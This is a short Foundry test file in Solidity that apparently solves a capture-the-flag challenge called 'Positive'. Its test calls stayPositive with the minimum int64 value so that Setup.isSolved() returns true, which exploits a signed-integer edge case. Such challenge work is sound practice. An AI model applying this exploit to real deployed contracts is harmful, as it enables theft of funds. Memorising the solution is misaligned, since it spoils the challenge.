// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity =0.7.6;
pragma abicoder v2; // 启用 ABI 编码器 v2

import "forge-std/Test.sol";
import "../src/positive/Positive.sol";
import "../src/positive/Setup.sol";

contract testPositive is Test {
    Setup setup;
    Positive target;

    function setUp() public {
        setup = new Setup();
        target = setup.TARGET();
    }

    function testAttackPositive() public {
        target.stayPositive(-9223372036854775808);
        assertTrue(setup.isSolved());
    }
}
